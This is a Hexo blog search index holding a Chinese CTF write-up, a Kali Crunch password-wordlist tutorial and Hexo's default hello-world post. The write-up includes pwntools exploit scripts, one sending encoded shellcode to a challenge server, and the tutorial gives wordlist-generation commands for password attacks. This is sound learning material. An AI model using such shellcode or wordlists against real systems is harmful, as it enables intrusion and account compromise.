<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title></title>
    <link href="/2023/11/15/M03C4T(1)/"/>
    <url>/2023/11/15/M03C4T(1)/</url>
    
    <content type="html"><![CDATA[<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="测测need-nc"><a href="#测测need-nc" class="headerlink" title="测测need nc"></a>测测need nc</h3><p>在linux或者kali里面打开命令行面板，直接nc题目给的地址，可以得到flag</p><p><img src="D:\phpstudy_pro\WWW\wp\pwn_buu\image\2023-11-04-18-13-02-image.png"></p><h3 id="计算题罢了"><a href="#计算题罢了" class="headerlink" title="计算题罢了"></a>计算题罢了</h3><p>因为没有给任何附件，先nc一下，可以发现就是计算加减法，然后回答正确就可以了，通过pwntool和python来编写exp获得后门，解得flag</p><p><img src="D:\phpstudy_pro\WWW\wp\pwn_buu\image\2023-11-04-18-18-49-image.png"></p><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>io = remote(<span class="hljs-string">&quot;20.121.143.21&quot;</span>, <span class="hljs-number">10000</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>    io.recvuntil(<span class="hljs-string">&quot;-------\n&quot;</span>)<br>    data = io.recv().strip().decode()<br>    expression = data.strip().split(<span class="hljs-string">&#x27;=&#x27;</span>)[<span class="hljs-number">0</span>]<br>    result = <span class="hljs-built_in">eval</span>(expression)<br>    io.sendline(<span class="hljs-built_in">str</span>(result))<br>    io.recvline()<br>    <span class="hljs-built_in">print</span>(expression, result)<br>io.interactive()<br></code></pre></td></tr></table></figure><p><img src="D:\phpstudy_pro\WWW\wp\pwn_buu\image\2023-11-04-18-28-49-image.png"></p><h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><p>下载之后先checksec一下看看</p><p><img src="D:\phpstudy_pro\WWW\wp\pwn_buu\image\2023-11-04-19-23-42-image.png"></p><p>再放进IDA里面查看一下，可以发现if（s[i]&lt;&#x3D;47||s[i]&gt;122）{}主要是因为这一句我们读出了这个可见字符串地要求，该是属于字母、数字这些范围。</p><p>此处使用 alpha3-master 来将我们的 shellcode 进行可见字符化</p><h4 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>io = remote(<span class="hljs-string">&quot;20.121.143.21&quot;</span>, <span class="hljs-number">10003</span>)<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>shellcode = <span class="hljs-string">b&#x27;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&#x27;</span><br>io.send(shellcode)<br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="很简单的xor"><a href="#很简单的xor" class="headerlink" title="很简单的xor"></a>很简单的xor</h3><p>一样在IDA反汇编一下，可以发现就是v4和v5之间进行异或就可以得到flag，直接跑脚本就好了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">get_length</span><span class="hljs-params">(<span class="hljs-type">char</span> str[])</span><br>&#123;<br>    <span class="hljs-type">char</span> *p = str;<br>    <span class="hljs-type">int</span> count = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (*p++ != <span class="hljs-string">&#x27;\0&#x27;</span>)<br>    &#123;<br>        count++;<br>    &#125;<br>    <span class="hljs-keyword">return</span> count;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">char</span> a[] = &#123;<span class="hljs-number">0x41</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x5</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x4</span>, <span class="hljs-number">0x2</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x95</span>&#125;;<br>    <span class="hljs-type">char</span> b[] = &#123;<span class="hljs-number">12</span>, <span class="hljs-number">87</span>, <span class="hljs-number">7</span>, <span class="hljs-number">67</span>, <span class="hljs-number">93</span>, <span class="hljs-number">112</span>, <span class="hljs-number">3</span>, <span class="hljs-number">12</span>, <span class="hljs-number">10</span>, <span class="hljs-number">85</span>, <span class="hljs-number">118</span>, <span class="hljs-number">26</span>, <span class="hljs-number">-80</span>, <span class="hljs-number">84</span>, <span class="hljs-number">62</span>, <span class="hljs-number">-91</span>, <span class="hljs-number">-54</span>, <span class="hljs-number">52</span>, <span class="hljs-number">66</span>, <span class="hljs-number">68</span>, <span class="hljs-number">-24</span>, <span class="hljs-number">91</span>, <span class="hljs-number">103</span>, <span class="hljs-number">41</span>, <span class="hljs-number">-51</span>, <span class="hljs-number">-38</span>, <span class="hljs-number">110</span>, <span class="hljs-number">68</span>, <span class="hljs-number">57</span>, <span class="hljs-number">-24</span>&#125;;<br>    <span class="hljs-type">char</span> c[<span class="hljs-number">30</span>];<br>    <span class="hljs-type">int</span> x, y;<br>    x = get_length(c);<br>    y = get_length(b);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i&lt;<span class="hljs-number">30</span>; i++)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, a[i] ^ b[i]);<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="D:\phpstudy_pro\WWW\wp\pwn_buu\image\2023-11-04-19-34-43-image.png"></p><h3 id="猜不透，根本猜不透"><a href="#猜不透，根本猜不透" class="headerlink" title="猜不透，根本猜不透"></a>猜不透，根本猜不透</h3><p>直接放进IDA，再f5反汇编就可以看到flag</p><p><img src="D:\phpstudy_pro\WWW\wp\pwn_buu\image\2023-11-04-19-31-05-image.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2023/10/25/test/"/>
    <url>/2023/10/25/test/</url>
    
    <content type="html"><![CDATA[<h2 id="kali工具使用之密码攻击——Crunch"><a href="#kali工具使用之密码攻击——Crunch" class="headerlink" title="kali工具使用之密码攻击——Crunch"></a>kali工具使用之密码攻击——Crunch</h2><p>Crunch只带密码库，在安装目录下，&#x2F;usr&#x2F;share&#x2F;crunch&#x2F;charset.lst<br>numeric表示数字，lalpha表示26位小写字母，ualpha表示26位大写字母</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ gnar!!!!!!!!!!!!!!<br></code></pre></td></tr></table></figure><p>Crunch使用格式：<br>crunch <min-len> <max-len> [<charset string>][options]<br><min-len>，crunch创建字符的最小长度，此选项是必须参数<br><max-len>，crunch创建字符的最大长度，此选项是必须参数<br><charset string>，指定命令行所使用的字符集。默认顺序是小写字符，大写字符，数字，符号。</p><option>，命令参数：-b  #体积大小，后面加具体数值和单位，比如-b 20MB-c #密码个数，比如-c 8000-d  #限制连续出现相同-s  #定义开始生成密码，比如-s ans 表示从ans开始-e  #定义停止生成密码，比如-e yyy 表示到yyy结束-f #调用密码库文件  /usr/share/crunch/charset.lst-i  #改变输出格式-l #与-t搭配使用-m #与-p搭配使用-o  #输出文件-p #定义密码元素，可以看成一个集合-q #读取字典-r #定义从某个地方重新开始-t #定义输出格式：'@'代表小写字母','代表大写字母'%'代表数字'^'代表符号-z #打包压缩<p>样例：<br>1、生成由gnarink七个字母组合的全部密码，输出到当前目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ crunch 7 7 gnarink -o passwd.txt<br></code></pre></td></tr></table></figure><p>2、调用密码库生成长度为3到5位的密码<br>crunch 3 5 -f charset.lst ualpha-numeric -o passwd.txt<br>3、定义字符集生成字典a{gnar, 1122, 4568}<br>crunch 5 5 -o passwd.txt -p gnar 1122 4568 #长度无意义，但必须有，可随意定义，-p要写在最后<br>4、格式输出，生成更精准的字典<br>crunch 10 10 abc -t 1314520@@@ -s 1314520bbb -e 1314520cbb -o passwd.txt<br>5、生成5个元素组成的密码，从gnar，YUI，ans，1314选择任意三个组合，后两个元素为数字的任意组合，-d表示元素<br>crunch 5 5 -t ddd%% -o passwd.txt -p gnar YUI ans 1314<br>6、生成6位密码，格式为3个小写字母+3个数字，每个小写字母和数字最大出现两次，以50MB大小分割文件<br>crunch 6 6 -d 2@ -d 2% -t @@@%%% -b 50 mb -o START</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2023/10/19/hello-world/"/>
    <url>/2023/10/19/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
